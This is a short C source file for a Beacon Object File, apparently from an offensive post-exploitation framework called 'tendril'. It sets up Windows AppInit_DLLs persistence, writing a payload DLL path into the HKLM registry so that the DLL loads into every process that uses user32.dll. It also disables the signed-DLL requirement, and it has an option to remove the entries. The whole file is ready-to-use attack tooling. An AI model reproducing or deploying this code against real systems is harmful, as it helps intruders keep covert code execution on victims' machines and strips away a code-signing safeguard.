/*
 * tendril-appinit-dlls BOF
 * AppInit_DLLs persistence - DLL loads into every user32.dll process
 *
 * Arguments (packed):
 *   wstr dllPath  - payload DLL path
 *   short arch    - 0 = x64, 1 = x86 (Wow6432Node)
 *   short action  - 0 = install, 1 = remove
 */
#include "tendril.h"

#define REGPATH_64 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
#define REGPATH_32 L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int dllLen;
    wchar_t* dllPath = (wchar_t*)BeaconDataExtract(&parser, &dllLen);
    short arch   = BeaconDataShort(&parser);
    short action = BeaconDataShort(&parser);

    LPCWSTR regPath = (arch == 1) ? REGPATH_32 : REGPATH_64;

    if (action == 0) /* install */
    {
        LSTATUS s1 = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, regPath, L"AppInit_DLLs", dllPath);
        LSTATUS s2 = tendril_reg_set_dword(HKEY_LOCAL_MACHINE, regPath, L"LoadAppInit_DLLs", 1);
        tendril_reg_set_dword(HKEY_LOCAL_MACHINE, regPath, L"RequireSignedAppInit_DLLs", 0);

        if (s1 == ERROR_SUCCESS && s2 == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AppInit_DLLs set: %ls", dllPath);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed (admin?): %d / %d", s1, s2);
    }
    else /* remove */
    {
        tendril_reg_set_sz(HKEY_LOCAL_MACHINE, regPath, L"AppInit_DLLs", L"");
        tendril_reg_set_dword(HKEY_LOCAL_MACHINE, regPath, L"LoadAppInit_DLLs", 0);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AppInit_DLLs cleared (%ls)", arch == 1 ? L"x86" : L"x64");
    }
}
